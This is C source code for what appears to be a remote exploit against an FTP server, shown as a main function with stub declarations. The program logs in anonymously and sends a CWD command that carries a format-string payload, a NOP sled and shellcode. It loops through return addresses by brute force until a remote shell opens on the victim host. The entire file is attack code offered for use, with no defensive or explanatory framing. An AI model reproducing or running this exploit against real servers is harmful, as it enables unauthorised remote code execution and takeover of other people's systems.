
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_short ;
typedef int u_long ;
typedef int u_int ;
struct TYPE_2__ {int written; int align; int retaddr; char* name; char* code; void* retloc; void* stackpops; } ;
typedef int FILE ;


 int BUFSIZE ;
 char* ELITEBANNER ;
 int EOF ;
 int NOP ;
 int answer (char*,int,int *) ;
 void* atoi (int ) ;
 int close (int) ;
 int connect_to_host (int,int) ;
 int die (char*) ;
 int exit (int) ;
 int fclose (int *) ;
 int * fdopen (int,char*) ;
 int fprintf (int *,char*,...) ;
 int getopt (int,char**,char*) ;
 int memset (char*,int ,int) ;
 char* mk_fmt_string (int,void*,void*,int,int) ;
 int optarg ;
 int res (char*) ;
 int shell (int) ;
 int sleep (int) ;
 int * stderr ;
 char* strdup (int ) ;
 int strlen (char*) ;
 int * strstr (char*,char*) ;
 void* strtoul (int ,int *,int) ;
 TYPE_1__* tg ;
 int usage (char*) ;
 scalar_t__ xmalloc (int) ;

int main(int argc, char *argv[])
{
 u_long ip, brute = 0x0 ;
 u_short port = 21 ;

 char * user = "ftp";
 char * pass = "ftp@";
 char * victim = "127.0.0.1";

 int opt, len, sock, t = 0 ;

 char buf[ BUFSIZE ],
  nopcode[ BUFSIZE ];

 char * evil = (char *)xmalloc( 10000 );
 FILE * sockf = ((void*)0) ;

 fprintf( stderr, ELITEBANNER );
 if ( argc < 2 ) { usage( argv[0] ); exit(-1); }

        while ((opt = getopt(argc, argv, "b:u:p:w:g:P:n:a:r:hv:t:")) != EOF) {
                switch(opt)
                {
   case 'b': brute = strtoul(optarg,((void*)0),16); break;
   case 't': t = atoi(optarg); break;
   case 'v': victim = strdup( optarg ); break;
   case 'u': user = strdup( optarg ); break;
   case 'p': pass = strdup( optarg ); break;
                        case 'w': tg[t].written = atoi(optarg); break;
                        case 'g': tg[t].retloc = strtoul(optarg,((void*)0),16); break;
                        case 'P': port = atoi(optarg); break;
                        case 'n': tg[t].stackpops = atoi(optarg); break;
                        case 'a': tg[t].align = atoi(optarg); break ;
                        case 'r': tg[t].retaddr = strtoul(optarg,((void*)0),16); break;
                        case 'h':
                        default : usage( argv[0] ); exit( -1 ); break ;
                }
        }

 fprintf( stderr, "[+] Using target %s\n", tg[ t ].name );

 if ( (ip = res( victim )) == -1 )
  die( "Bad hostname or ip." );

 do {
  if ( (sock = connect_to_host( ip, port )) > 0 ) {
   sockf = fdopen ( sock, "a+" );
   if ( fdopen == ((void*)0) ) die( "fdopen failed." );
  }
  else die( "Cannot connect to host." );

  fprintf( stderr, "[+] Trying to log in...\n");

         answer( buf, BUFSIZE, sockf );
  fprintf( sockf, "USER %s\r\n", user);
         answer( buf, BUFSIZE, sockf );
  fprintf( sockf, "PASS %s\r\n", pass);
         answer( buf, BUFSIZE, sockf );

  if ( strstr( buf, "logged in" ) == ((void*)0) )
   die( "Cannot log in, wrong user/pwd ?" );
  else
   fprintf( stderr, "[+] Doing the actual exploit...\n");

  fprintf( sockf, "CWD /\r\n" );
  answer( buf, BUFSIZE, sockf );

  fprintf( sockf, "CWD " );

  evil = mk_fmt_string( tg[ t ].align,
                                tg[ t ].stackpops,
           tg[ t ].retloc,
                                brute ? brute : tg[ t ].retaddr,
                                tg[ t ].written
  );



  len = 256 - strlen( "CWD " ) - strlen( tg[t].code ) - strlen( evil ) - 4;
  memset( nopcode, NOP, len );
  nopcode[ len ] = 0 ;




  fprintf( stderr, "[+] Using written=%d align=%d retaddr=0x%.08x retloc=0x%.08x nops=%d\n",
  tg[t].written, tg[t].align, brute ? (u_int)brute : (u_int)tg[t].retaddr, (u_int)tg[t].retloc, len );

  fprintf( sockf, "%s", evil );
  fprintf( sockf, "%s", nopcode );
  fprintf( sockf, "%s", tg[t].code );
  fprintf( sockf, "\r\n" );
  fprintf( sockf, "QUIT\r\n" );
  if ( brute ) brute -= len ;
  fclose( sockf );
  close( sock );
  sleep( 1 );
 }
 while (( shell( ip ) == -1 ) && ( brute > 0xbffff000 ));

 fprintf( stderr, "[-] Bye\n");
 return( 0xc1a0 );
}
